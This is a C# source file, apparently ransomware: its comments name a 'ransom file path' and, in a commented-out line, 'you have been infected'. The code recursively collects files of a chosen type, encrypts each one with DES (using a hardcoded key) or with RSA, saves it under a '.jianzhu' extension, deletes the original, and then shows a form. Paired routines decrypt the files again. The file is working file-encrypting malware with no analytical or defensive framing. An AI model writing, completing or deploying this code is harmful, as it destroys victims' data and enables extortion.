using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Security.Cryptography;

namespace MyProject1
{



        public class T
        {
            public string path2;    //勒索文件路径
            public string pattern;  //文件类型
            public List<string> j { get; set; }  //文件名称列表
            public string PublicKey { get; set; } //非对称加密公钥
            public string PrivateKey { get; set; }//非对称加密私钥


        public T(string path2, string pattern)
            {
                this.path2 = path2;
                this.pattern = pattern;

            }



            public void Fu()  //用des加密文件
            {
            //List<string> j = new List<string>();  PrivateKey.xml

            this.j = GetFiles(path2, pattern);
              // MessageBox.Show((j.Count).ToString());
                // File.Delete(j[0]);
                if (j.Count != 0)
                {
                    for (int i = 0; i < j.Count; i++)
                    {
                        byte[] b = File.ReadAllBytes(j[i]);

                    if (b.Length <= 9651196)
                    {
                        //MessageBox.Show((b.Length).ToString());
                        try
                        {
                            byte[] c = this.Encrypt(b, "eeeeewedfwef");


                            File.WriteAllBytes(j[i] + ".jianzhu", c);
                            File.Delete(j[i]);
                        }
                        catch
                        {




                        }
                    }
                       // Random random = new Random();
                    //File.Delete(j[i]);
                    // File.WriteAllText(j[i], random.Next().ToString());

                    //FileStream file1 = new FileStream(j[i] + ".jianzhu", FileMode.CreateNew, FileAccess.Write);


                    //file1.Write(c, 0, c.Length);//写入二进制
                    //file1.Dispose();


                    //byte[] d = File.ReadAllBytes(j[i] + ".jianzhu");
                    //  byte[] e = this.Decrypt(d, "eeeeewedfwef");
                    //  File.WriteAllBytes(j[i] + ".jianzhujie", e);


                }
                }













           
            Form1 f = new Form1();
          //  MessageBox.Show("你中毒了");
            Control.CheckForIllegalCrossThreadCalls = false;
            f.AllowDrop = false;

            f.ShowDialog();



        }





        public void Fu2()   //用RSA算法非对称加密文件
        {

            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(1024);

            //将公钥导入到RSA对象中，准备加密；
           rsa.FromXmlString(PublicKey);

            //对数据data进行加密，并返回加密结果；
            //第二个参数用来选择Padding的格式
            
            //return buffer;
            //List<string> j = new List<string>();  PrivateKey.xml

            this.j = GetFiles(path2, pattern);
            // MessageBox.Show((j.Count).ToString());
            // File.Delete(j[0]);
            if (j.Count != 0)
            {
                for (int i = 0; i < j.Count; i++)
                {
                    byte[] b = File.ReadAllBytes(j[i]);

                    if (b.Length <= 9651196)
                    {

                         try {

                        string niuyifan =  Convert.ToBase64String(b);
                        string cc = RSADecryptEncrypt.Encrypt(PublicKey, niuyifan);
                        byte[] c = Convert.FromBase64String(cc);




                            File.WriteAllBytes(j[i] + ".jianzhu", c);
                       // MessageBox.Show((c.Length).ToString());
                        File.Delete(j[i]);
                        //
                        } catch{  }
                    }
                    // Random random = new Random();
                    //File.Delete(j[i]);
                    // File.WriteAllText(j[i], random.Next().ToString());

                    //FileStream file1 = new FileStream(j[i] + ".jianzhu", FileMode.CreateNew, FileAccess.Write);


                    //file1.Write(c, 0, c.Length);//写入二进制
                    //file1.Dispose();


                    //byte[] d = File.ReadAllBytes(j[i] + ".jianzhu");
                    //  byte[] e = this.Decrypt(d, "eeeeewedfwef");
                    //  File.WriteAllBytes(j[i] + ".jianzhujie", e);


                }
            }
            Form1 f = new Form1();
            //  MessageBox.Show("你中毒了");
            Control.CheckForIllegalCrossThreadCalls = false;
            f.AllowDrop = false;

            f.ShowDialog();



        }







        public void jie() //DES对称算法解密文件
        {
            //List<string> j = new List<string>();

            this.j = GetFiles(path2, pattern);
            // MessageBox.Show((j.Count).ToString());
            // File.Delete(j[0]);
            if (j.Count != 0)
            {
                for (int i = 0; i < j.Count; i++)
                {
                    //byte[] b = File.ReadAllBytes(j[i]);
                    //MessageBox.Show((b.Length).ToString());
                    //byte[] c = this.Encrypt(b, "eeeeewedfwef");


                    //File.WriteAllBytes(j[i] + ".jianzhu", c);
                    //File.Delete(j[i]);
                    // Random random = new Random();
                    // File.WriteAllText(j[i], random.Next().ToString());

                    //FileStream file1 = new FileStream(j[i] + ".jianzhu", FileMode.CreateNew, FileAccess.Write);


                    //file1.Write(c, 0, c.Length);//写入二进制
                    //file1.Dispose();


                    //byte[] d = File.ReadAllBytes(j[i] + ".jianzhu");25651196

                    byte[] d = File.ReadAllBytes(j[i]);
                    
                        try
                        {
                            byte[] e = this.Decrypt(d, "eeeeewedfwef");
                            // File.WriteAllBytes(j[i] + ".jianzhujie", e);
                            File.WriteAllBytes((j[i]).Replace(".jianzhu", ""), e);
                            File.Delete(j[i]);
                        }
                        catch
                        {
                            File.WriteAllBytes((j[i]).Replace(".jianzhu", ""), d);
                            File.Delete(j[i]);



                        }
                    


                }

               // MessageBox.Show("解密成功");
                MessageBox.Show("解密成功", "", MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);


            }



        }



        public void jie2() //RSA非对称算法解密文件
        {


            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(1024);

            //将私钥导入RSA中，准备解密；
            rsa.FromXmlString(PrivateKey);

            //对数据进行解密，并返回解密结果；
             
            //List<string> j = new List<string>();

            this.j = GetFiles(path2, pattern);
            // MessageBox.Show((j.Count).ToString());
            // File.Delete(j[0]);
            if (j.Count != 0)
            {
                for (int i = 0; i < j.Count; i++)
                {
                    //byte[] b = File.ReadAllBytes(j[i]);
                    //MessageBox.Show((b.Length).ToString());
                    //byte[] c = this.Encrypt(b, "eeeeewedfwef");


                    //File.WriteAllBytes(j[i] + ".jianzhu", c);
                    //File.Delete(j[i]);
                    // Random random = new Random();
                    // File.WriteAllText(j[i], random.Next().ToString());

                    //FileStream file1 = new FileStream(j[i] + ".jianzhu", FileMode.CreateNew, FileAccess.Write);


                    //file1.Write(c, 0, c.Length);//写入二进制
                    //file1.Dispose();


                    //byte[] d = File.ReadAllBytes(j[i] + ".jianzhu");25651196

                    byte[] d = File.ReadAllBytes(j[i]);

                    try
                    {
                        string niuyifan = Convert.ToBase64String(d);
                        string ee = RSADecryptEncrypt.Decrypt(PrivateKey, niuyifan);
                        byte[] e = Convert.FromBase64String(ee);
                        // File.WriteAllBytes(j[i] + ".jianzhujie", e);
                        File.WriteAllBytes((j[i]).Replace(".jianzhu", ""), e);
                        File.Delete(j[i]);
                    }
                    catch
                    {
                        File.WriteAllBytes((j[i]).Replace(".jianzhu", ""), d);
                        File.Delete(j[i]);



                    }



                }

                // MessageBox.Show("解密成功");
                MessageBox.Show("解密成功", "", MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);


            }



        }









        //获得文件列表
        private List<string> GetFiles(string path, string pattern)
            {
                var files = new List<string>();

                try
                {
                    files.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
                    foreach (var directory in Directory.GetDirectories(path))
                        files.AddRange(GetFiles(directory, pattern));
                }
                //catch (UnauthorizedAccessException) { }
                catch { }
                return files;
            }



        //DES加密算法
            private byte[] Encrypt(byte[] inputByteArray, string sKey)
            {
                DESCryptoServiceProvider des = new DESCryptoServiceProvider();
                //  byte[] inputByteArray = Encoding.Default.GetBytes(str);


                sKey = ToDES(sKey);
                des.Key = ASCIIEncoding.ASCII.GetBytes(sKey);// 密匙
                des.IV = ASCIIEncoding.ASCII.GetBytes(sKey);// 初始化向量
                MemoryStream ms = new MemoryStream();
                CryptoStream cs = new CryptoStream(ms, des.CreateEncryptor(), CryptoStreamMode.Write);
                cs.Write(inputByteArray, 0, inputByteArray.Length);
                cs.FlushFinalBlock();
                // var retB = Convert.ToBase64String(ms.ToArray());
                return (ms.ToArray());
            }

            public static string ToDES(string str)
            {
                if (str.Length <= 8)
                {
                    str = str.ToLower().PadRight(8, 'a');//在字符串右边加a加满8位！！！
                    return str;
                }
                else
                {
                    str = str.Substring(0, 8);
                }
                return str;
            }




        //DES解密算法
            private byte[] Decrypt(byte[] inputByteArray, string sKey)
            {
                DESCryptoServiceProvider des = new DESCryptoServiceProvider();
                sKey = ToDES(sKey);
                //byte[] inputByteArray = Convert.FromBase64String(pToDecrypt);
                des.Key = ASCIIEncoding.ASCII.GetBytes(sKey);
                des.IV = ASCIIEncoding.ASCII.GetBytes(sKey);
                MemoryStream ms = new MemoryStream();
                CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(), CryptoStreamMode.Write);
                cs.Write(inputByteArray, 0, inputByteArray.Length);
                // 如果两次密匙不一样，这一步可能会引发异常
                cs.FlushFinalBlock();
                return (ms.ToArray());
                //return inputByteArray;
            }



        }



}
